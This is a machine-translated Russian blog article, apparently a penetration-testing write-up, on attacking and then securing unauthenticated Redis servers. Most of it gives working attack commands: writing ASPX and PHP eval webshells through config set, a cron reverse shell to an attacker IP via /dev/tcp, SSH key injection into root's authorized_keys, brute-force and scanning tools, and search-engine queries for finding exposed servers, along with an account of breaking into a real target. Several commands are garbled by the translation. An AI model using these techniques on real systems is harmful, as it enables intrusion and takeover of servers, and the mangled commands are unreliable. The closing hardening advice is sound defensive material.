 Redis Эксплоит и Оборона

Redis широко используется в крупных компаниях. В результате исследования, проведенного автором, выяснилось, что в Интернете появились несанкционированные вирусоподобные автоматические атаки Redis. После успешных атак внутренняя сеть сканируется, контролируется, заражается и используется для добычи и вымогательства. Что касается злонамеренного поведения, то ранее в Интернете была проанализирована статья «Сервер, зараженный версией Linux вымогателей через redis» (http://www.sohu.com/a/143409075_765820) Если компания использует Redis, то ей следует уделить внимание. С помощью реальных исследований при определенных условиях злоумышленник может получить веб-оболочку и даже корневые разрешения.
1.1.1 Введение в Redis и настройка экспериментальной среды

REmote DIctionary Server (Redis) - это система хранения ключей и значений, написанная Сальваторе Санфилиппо.

Redis - это база данных Key-Value с открытым исходным кодом, написанная на языке ANSI C, соответствующая протоколу BSD, поддерживающая работу в сети, основанная на памяти и постоянная, и предоставляет API на нескольких языках. Его часто называют сервером структуры данных, поскольку значениями могут быть строка, карта, список, наборы и отсортированные наборы. С 15 марта 2010 года работа по разработке Redis осуществляется VMware. Начиная с мая 2013 года, разработка Redis была спонсирована Pivotal. Последняя стабильная версия - 4.0.8.

1.Redis порт по умолчанию

Порт конфигурации Redis по умолчанию - 6379, а порт конфигуратора sentinel.conf - 26379.

2. Официальный сайт

https://redis.io/

http://download.redis.io/releases/redis-3.2.11.tar.gz

3. Установите Redis

 

    wget http://download.redis.io/releases/redis-4.0.8.tar.gz
    tar –xvf redis-4.0.8.tar.gz
    cd redis-4.0.8
    make

В последней версии предыдущей версии уязвимости исправлено, рекомендуется установить версию 3.2.11 при тестировании.

4. Измените файл конфигурации redis.conf

 

    （1）cp redis.conf ./src/redis.conf
     (2) Свяжите 127.0.0.1 с # перед комментарием
     (3) Защищенный режим установлен на нет
     (4) Запустить редис-сервер
    ./src/redis-server redis.conf

После успешной установки последней версии, как показано на рисунке 1. Конфигурация по умолчанию - использовать порт 6379 без пароля. Это приведет к несанкционированному доступу, а затем запишите файл с разрешениями redis.

01.jpg

Рисунок 1 Установите и настройте Redis

5. Подключитесь к серверу Redis

(1) Интерактивный режим

redis-cli -h {host} -p {port}

Соединение, а затем все операции выполняются в интерактивном режиме. Вам не нужно снова выполнять redis-cli. Например, команда: redis-cli -h 127.0.0.1-p 6379, а параметр -a указывает доступ с паролем.

(2) Командный режим

redis-cli -h {host} -p {port} {command}

Получите результат возврата команды напрямую.

6. Общие команды

 

    (1) Просмотр информации: информация
     (2) Удалить все содержимое базы данных: flushall
     (3) Очистить базу данных: flushdb
     (4) Посмотрите на все ключи: KEYS *, используйте select num для просмотра данных значения ключа.
     (5) Установите переменную: установите тест "кто амам"
     (6) config set dir dir path
     (7) config getdir / dbfilename получить путь и информацию о конфигурации данных
     (8) сохранить
     (9) получить переменную, посмотреть имя переменной

Другие команды могут ссылаться на статью:https://www.cnblogs.com/kongzhongqijing/p/6867960.html

7. Связанные уязвимости

Из-за неправильной конфигурации может быть получен несанкционированный доступ, и злоумышленник может получить доступ к внутренним данным без аутентификации. Уязвимость может привести к раскрытию конфиденциальной информации (сервер Redis сохраняет некоторые интересные сеансы, файлы cookie или бизнес-данные через значение ключа перечисления) Вы можете злонамеренно выполнить flushall, чтобы очистить все данные.Заключители могут также выполнить код lua через EVAL или записать файлы бэкдора на диск с помощью функции резервного копирования данных. Если Redis работает от имени пользователя root, вы можете записать файл открытого ключа SSH в корневую учетную запись и напрямую войти на сервер без пароля. Информация об уязвимости выглядит следующим образом:

(1) Уязвимость Redis, связанная с удаленным выполнением кода (CVE-2016-8339)

Redis 3.2.x <3.2.4 имеет уязвимость переполнения буфера, которая может привести к выполнению произвольного кода. Опция client-output-buffer-limit в команде CONFIG SET, хранящейся в структуре данных Redis, обрабатывает уязвимость записи за пределы допустимой записи. Созданная команда CONFIG SET может вызвать запись за пределы и выполнение кода.

（2）CVE-2015-8080

В Redis 2.8.x до 2.8.24 и 3.0.x до 3.0.6 существует целочисленное переполнение в функции getnum в lua_struct.c, что позволяет контекстно-зависимым злоумышленникам разрешить запуск кода Lua (повреждение памяти и сбой приложения) или, возможно, Обход ограничений песочницы предназначен для передачи большого числа, вызывая переполнение буфера в стеке.

（3）CVE-2015-4335

В версиях, предшествующих Redis 2.8.1, и версиях 3.x, предшествующих 3.0.2, существуют уязвимости в системе безопасности. Удаленный злоумышленник может выполнить команду eval, чтобы использовать эту уязвимость для выполнения произвольного байт-кода Lua.

（4）CVE-2013-7458

Прочитайте информацию профиля ".rediscli_history".
1.1.2 Идеи атаки Redis

Сканирование портов в интрасети

nmap -v -n -Pn -p 6379 -sV --scriptredis-info 192.168.56.1/24

2. Прочитайте его файл конфигурации через включение файла

В файле конфигурации Redis обычно устанавливается простой текстовый пароль. Вы также можете просмотреть его файл конфигурации через веб-оболочку во время проникновения. Redis часто имеет более одного компьютера, который можно использовать для проникновения в интрасеть или расширенного проникновения разрешений.

3. Используйте инструмент грубой силы Redis

https://github.com/evilpacket/redis-sha-crackЕго команда:

node ./redis-sha-crack.js -w wordlist.txt -s shalist.txt 127.0.0.1 host2.example.com:5555

Нужно установить узел:

 

git clone https://github.com/nodejs/node.gitchmod -R 755 nodecd node./configuremake

Модуль использования 4.msf

 

auxiliary/scanner/redis/file_upload    normal     Redis File Uploadauxiliary/scanner/redis/redis_login    normal     Redis Login Utilityauxiliary/scanner/redis/redis_server   normal     Redis Command Execute Scanner

1.1.3 Redis Exploit

Получить веб-оболочку

Когда разрешение redis невысокое, а на сервере запущена веб-служба. Когда redis имеет разрешение на запись в веб-каталог, вы можете попытаться записать веб-оболочку в веб-путь при условии, что вы знаете физический путь.

 

config set dir E:/www/fontconfig set dbfilename redis2.aspxset a "<%@ Page Language=\"Jscript\"%><%eval(Request.Item[\"c\"],\"unsafe\");%>"save

Отказов оболочки

(1) Подключиться к серверу Redis

redis-cli –h 192.168.106.135 –p 6379

(2) Выполнено 192.168.106.133

nc –vlp 7999

(3) Выполните следующую команду

 

set \ x \ n \ n * *** * bash-i >> / dev / tcp / 192.168.106.133 / 7999 0> & 1 \ n \ n "config set Файл dir / var / spool / cron / ubantu: / var / spool / cron / crontabs / config set dir / var / spool / cron / crontabs / config установить имя файла базы данных

3. Войти по ssh без пароля

 

ssh-keygen -t rsaconfig set dir /root/.ssh/config set dbfilename authorized_keysset x "\n\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDZA3SEwRcvoYWXRkXoxu7BlmhVQz7Dd8H9ZFV0Y0wKOok1moUzW3+rrWHRaSUqLD5+auAmVlG5n1dAyP7ZepMkZHKWU94TubLBDKF7AIS3ZdHHOkYI8y0NRp6jvtOroZ9UO5va6Px4wHTNK+rmoXWxsz1dNDjO8eFy88Qqe9j3meYU/CQHGRSw0/XlzUxA95/ICmDBgQ7E9J/tN8BWWjs5+sS3wkPFXw1liRqpOyChEoYXREfPwxWTxWm68iwkE3/22LbqtpT1RKvVsuaLOrDz1E8qH+TBdjwiPcuzfyLnlWi6fQJci7FAdF2j4r8Mh9ONT5In3nSsAQoacbUS1lul root@kali2018\n\n\n"save

Эффект реализации показан на рисунке 2.

02 .jpg

Рис. 2 Уязвимость Redis при входе через SSH без пароля

4. Поиск с помощью поисковика уязвимостей

(1) Поиск "порт: 6379"

https://www.zoomeye.org/searchResult?q=port:6379

(2) Исключая результат «Требуется аутентификация -NOAUTH». Отображение этой информации указывает, что требуется аутентификация, то есть пароль для доступа.

（3）https://fofa.so/

Поиск по ключевому слову: port = "6379" && protocol == redis && country = CN
1.1.4 Учетная запись Redis для получения боя в Webshell

1. Сканирование информации о порте целевого сервера

Полное сканирование портов было выполнено на целевом сервере через nmap, и было обнаружено, что открытый порт Redis для цели - 3357, а порт по умолчанию - 6379. Сканируйте порт того же сервера сегмента сети снова с помощью программы сканирования iis put. Как показано на рисунке 3, получите два Сервер, который открывает порт.

03 .jpg

Рисунок 3 Сканирование серверов, которые открывают порт в том же сегменте сети

2. Войдите на сервер, используя telnet.

Для входа в систему используйте команду «telnet ip port», например, telnet 1 **. **. **. 78 3357. После входа в систему введите auth и пароль для аутентификации.

3. Просмотр и сохранение информации о текущей конфигурации

Используйте команду config get для просмотра информации о dir и dbfilename и скопируйте ее для последующего восстановления.

 

config get dirconfig get dbfilename

4. Настройте и напишите в веб-оболочку

(1) Установите путь

config set dir E:/www/font

(2) Установите имя базы данных

Задайте имя dbfilename для файла, который поддерживает типы сценариев. Например, если веб-сайт поддерживает php, вы можете установить file.php. В этом случае aspx, поэтому установите redis.aspx.

config set dbfilename redis.aspx

(3) Установите содержание веб-оболочки

Установите содержимое веб-оболочки в соответствии с реальной ситуацией. Веб-оболочка является только переменной и может содержать любые другие символы, такие как a. Ниже приведены некоторые справочные примеры.

 

set webshell "<? php phpinfo ();?" "// веб-оболочка набора информации phpView" <? php @eval ($ _ POST ['chopper']);?> "// веб-оболочка phpwebshellset" <% @ @ PagePageLanguage = \ "Jscript \"%> <% eval (Request.Item [\ "c \"], \ "unsafe \");%> "// aspx webshell, обратите внимание на использование двойных кавычек \"

(4) Сохранить письменный контент

save

(5) Просмотр содержимого веб-оболочки

get webshell

Полная команда выполнения процесса показана на рисунке 4. Каждый раз, когда команда отображает «+ OK», конфигурация успешна.

04.jpg

Рисунок 4 Запись в веб-оболочку

5. Проверьте, является ли веб-оболочка нормальной

Введите имя соответствующего файла в браузере и получите доступ к нему, как показано на рисунке 5, аналогично:

«REDIS0006? Webshell'a @ H ???» означает, что веб-оболочка получена правильно.

05.jpg

Рисунок 5 тестовая веб-оболочка в норме

6. Получить веб-оболочку

Как показано на Рисунке 6, с помощью инструмента подключения для управления бэкдором китайского кухонного ножа веб-сайт был успешно получен.

06.jpg

Рисунок 6 Получить веб-оболочку

7. Восстановите исходные настройки

(1) Восстановить каталог

config set dir dirname

(2) Восстановить имя файла базы данных

config set dbfilename dbfilename

(3) Удалить веб-оболочку

del webshell

(4) обновить базу данных

flushdb

8. Полная командная сводка

 

telnet 1**.**.**.35 3357auth 123456config get dirconfig get dbfilenameconfig set dir E:/www/config set dbfilename redis2.aspxset a "<%@ Page Language=\"Jscript\"%><%eval(Request.Item[\"c\"],\"unsafe\");%>"saveget a

9. Просмотрите конфигурационный файл конфигурации redis

Через веб-оболочку redis с другими адресами находится в соответствующем каталоге. Этот же метод можно использовать для повторного проникновения. Как показано на рисунке 7, вы можете увидеть путь, порт, пароль и другую информацию.

07 .jpg

Рисунок 7 Просмотр файла конфигурации Redis
1.1.5 Redis обнаружение вторжений и предотвращение безопасности

Обнаружение вторжения

(1) Ключ обнаружения

Войдите локально и проверьте с помощью команды «keys *». Если есть вторжение, будет много значений, как показано на рисунке 8. После успешного выполнения ключей * вы увидите, что есть команды trojan1 и trojan2, и вы можете запустить get trojan1 Проверьте это.

08 .jpg

Рисунок 8 Проверка ключей

(2) авторизованный ключ должен быть проверен под Linux

Redis имеет встроенный ключ crackit, который также может иметь другие значения. В то же время параметр dir в файле conf Redis указывает на /root/.ssh. Ценность знать, если это было скомпрометировано.

(3) Сканирование и анализ веб-оболочки веб-сайта и обнаружение того, что с помощью уязвимости учетной записи Redis имя Redis будет найдено в оболочке.

(4) Бэкдор осмотр и обработка сервера.

2. Исправить это

(1) Запретить общедоступной сети открывать порт Redis, вы можете отключить порт Redis 6379 на брандмауэре

(2) Проверьте, является ли author_keys недопустимым. Если он был изменен, его можно восстановить и восстановить, а измененный файл нельзя использовать. И перезапустите службу ssh (служба перезапуска ssh)

(3) Добавить Redis пароль аутентификации

Сначала остановите службу REDIS и откройте файл конфигурации redis.conf (разные файлы конфигурации могут иметь разные пути) /etc/redis/6379.conf, найдите ## requirepass foobared, удалите предыдущий знак #, а затем измените foobared на ваши собственные настройки Пароль, перезапустите сервис redis.

(4) Измените файл conf, чтобы предотвратить доступ ко всей сети. Откройте файл 6379.conf и найдите bind0.0.0.0, за которым следует # (запретить доступ ко всей сети).

3.Обратитесь к команде модификации закалки

 

    порт Измените номер порта по умолчанию, используемый redis
     привязать, чтобы установить выделенный IP для прослушивания Redis
     requirepass установить пароль для подключения к Redis
     команда переименования CONFIG ""   # Отключить команду CONFIG
     команда переименования infoinfo2 # Переименование информации в info2

1.1.6 Резюме

 

 

Когда многие люди видят сетевую атаку и защиту, они находят атаки проникновения трудными, глубокими и сложными. В ответ на призывы читателей я буду использовать блог 51CTO в качестве платформы, чтобы объединить практический опыт сетевых атак и защиты, накопленный за последние 18 лет, и объединить их в 17 статей. ,

В этом столбце в основном рассказывается о том, как использовать SQLmap для сетевых атак и защиты.Материалы варьируются от мелких до глубоких, от установки и интерпретации параметров команд SQLmap в SQLMap, до различных сценариев атак и различных методов эксплуатации.

Каждый пример в столбце - это тщательно отобранная инфильтрация из реальной среды, и это история проникновения с картинками и текстами.

Если у вас есть какие-либо вопросы, пожалуйста, не стесняйтесь оставить сообщение, и я отвечу в любое время.
